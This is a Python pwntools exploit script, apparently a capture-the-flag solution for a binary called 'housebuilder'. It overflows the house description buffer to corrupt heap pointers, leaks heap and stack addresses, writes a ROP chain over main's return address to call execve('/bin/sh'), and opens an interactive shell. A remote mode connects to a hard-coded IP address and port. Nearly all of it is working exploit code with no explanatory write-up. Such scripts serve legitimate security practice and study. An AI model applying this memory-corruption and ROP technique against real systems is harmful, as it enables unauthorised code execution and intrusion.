#!/usr/bin/python3

"""
0x000000000040490a : pop rdi ; ret              # It has bad chars
0x000000000041432a : pop rdi ; pop rbp ; ret
0x0000000000407668 : pop rsi ; ret
0x00000000004044cf : pop rdx ; ret
0x000000000041fcba : pop rax ; ret
0x0000000000403c73 : syscall
"""

from pwn import *

# Gadgets

pop_rdi_rbp_addr = 0x41432a 
pop_rsi_addr = 0x407668 
pop_rdx_addr = 0x4044cf 
pop_rax_addr = 0x41fcba 
syscall_addr = 0x403c73 

context.arch = 'amd64'
context.terminal = 'tmux split -h'.split(' ')
# context.log_level = 'debug'

elf = ELF('housebuilder')

if args.REMOTE:
    p = remote('151.236.114.211', 17174)
else:
    p = process(elf.path)
    if args.GDB:
        gdb.attach(p, '''
            break * 0x404ea0
            continue
            ''')

def choose(choice):
    p.sendlineafter(b'} > ', str(choice).encode())

# Main options

def create_house(name, rooms, floors, people):
    choose(1)
    p.sendlineafter(b'name: ', name)
    p.sendlineafter(b'count: ', str(rooms).encode())
    p.sendlineafter(b'count: ', str(floors).encode())
    p.sendlineafter(b'count: ', str(people).encode())

def enter_house(index):
    choose(2)
    p.sendlineafter(b'idx: ', str(index).encode())

def list_houses():
    choose(3)

def delete_house(index):
    choose(4)
    p.sendlineafter(b'idx: ', str(index).encode())

def exit_main():
    choose(5)

# House options

def view_house():
    choose(1)

def change_desc(description):
    choose(2)
    p.sendlineafter(b'description: ', description)

def sell_house():
    choose(3)

def exit_house():
    choose(4)

# 1. Leak heap address

create_house(b'/bin/sh', 0x41, 0x41, 0x41)
create_house(b'B' * 0x8, 0x42, 0x42, 0x42)

enter_house(0)

description = b'C' * 0x400 + p64(0) + p64(0x51) + p64(0x42) * 3 + p64(elf.sym.HousesList) + p8(0x8)
change_desc(description)

exit_house()
enter_house(1)

p.recvuntil(b'House {')
heap_leak = u64(p.recv(8))
heap_addr = heap_leak - 0x14bf0
bin_sh_addr = heap_leak + 0x28

log.info(f'heap leak = {hex(heap_leak)}')
log.info(f'heap @ {hex(heap_addr)}')
log.info(f'/bin/sh @ {hex(bin_sh_addr)}')

# 2. Leak stack address

exit_house()
enter_house(0)

description = b'C' * 0x400 + p64(0) + p64(0x51) + p64(0x42) * 3 + p64(elf.sym.__libc_argv) + p8(0x8)
change_desc(description)

exit_house()
enter_house(1)

p.recvuntil(b'House {')
stack_leak = u64(p.recv(8))
ret_main = stack_leak - 0x130

log.info(f'stack leak = {hex(stack_leak)}')
log.info(f'ret_main @ {hex(ret_main)}')

# 3. Write ROP chain starting @ RET main

rop  = b''
rop += p64(pop_rdi_rbp_addr)
rop += p64(bin_sh_addr)
rop += p64(0)
rop += p64(pop_rsi_addr)
rop += p64(0)
rop += p64(pop_rdx_addr)
rop += p64(0)
rop += p64(pop_rax_addr)
rop += p64(constants.SYS_execve+0)
rop += p64(syscall_addr)

exit_house()
enter_house(0)

description = b'C' * 0x400 + p64(0) + p64(0x51) + p64(0x42) * 3 + p64(elf.sym.__libc_argv) + p64(0x8) + p64(0) * 2 + p64(ret_main)
change_desc(description)

exit_house()
enter_house(1)

description = rop
change_desc(description)

# 4. Spawn a shell

exit_house()
exit_main()

p.interactive()
